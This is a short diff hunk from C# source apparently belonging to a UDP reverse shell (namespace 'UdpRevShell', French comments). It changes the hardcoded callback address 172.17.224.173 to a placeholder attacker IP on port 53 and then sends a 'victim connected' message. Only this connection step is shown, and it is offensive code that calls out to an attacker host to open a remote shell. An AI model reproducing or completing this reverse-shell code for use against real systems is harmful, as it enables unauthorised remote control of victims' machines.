@@ -27,7 +27,7 @@ namespace UdpRevShell
 
 			try{
 				// Connexion distante
-				udpClient.Connect("172.17.224.173", 53);
+				udpClient.Connect("<IP ATTAQUANT", 53);
 
 				// Envoi d'un message à l'établissement de la connexion
 				Byte[] sendBytes = Encoding.ASCII.GetBytes("Victime connectee !\n");
